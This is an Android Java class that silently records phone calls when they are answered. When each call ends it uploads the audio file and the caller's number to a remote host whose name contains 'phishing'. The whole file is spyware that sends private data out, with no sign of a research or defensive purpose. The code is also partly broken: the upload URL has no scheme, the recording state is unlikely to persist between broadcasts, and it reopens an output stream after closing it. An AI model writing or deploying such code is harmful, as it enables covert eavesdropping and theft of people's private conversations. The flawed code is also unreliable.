public class CallReceiver extends BroadcastReceiver {

    private boolean isRecording = false;
    private MediaRecorder recorder;
    private String phoneNumber;

    @Override
    public void onReceive(Context context, Intent intent) {
        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

        if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
            phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
        } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
            startRecording(context);
        } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
            if (isRecording) {
                stopRecording();
                sendRecordingToServer(context);
            }
        }
    }

    private void startRecording(Context context) {
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(context.getExternalFilesDir(null).getAbsolutePath() + "/call_recording.3gp");

        try {
            recorder.prepare();
            recorder.start();
            isRecording = true;
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void stopRecording() {
        recorder.stop();
        recorder.release();
        isRecording = false;
    }

    private void sendRecordingToServer(Context context) {
        String filePath = context.getExternalFilesDir(null).getAbsolutePath() + "/call_recording.3gp";
        new Thread(() -> {
            try {
                File file = new File(filePath);
                FileInputStream fileInputStream = new FileInputStream(file);
                HttpURLConnection connection = (HttpURLConnection) new URL("evision-phishing.kro.kr").openConnection();
                connection.setDoOutput(true);
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=*****");

                DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
                outputStream.writeBytes("--*****\r\n");
                outputStream.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\""
                        + file.getName() + "\"" + "\r\n");
                outputStream.writeBytes("\r\n");

                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }

                outputStream.writeBytes("\r\n");
                outputStream.writeBytes("--*****--\r\n");
                outputStream.flush();
                outputStream.close();
                fileInputStream.close();

                // 전화번호도 전송
                DataOutputStream dataOutputStream = new DataOutputStream(connection.getOutputStream());
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"phoneNumber\"\r\n");
                dataOutputStream.writeBytes("\r\n");
                dataOutputStream.writeBytes(phoneNumber);
                dataOutputStream.writeBytes("\r\n");
                dataOutputStream.writeBytes("--*****--\r\n");

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // 서버로의 전송 성공
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
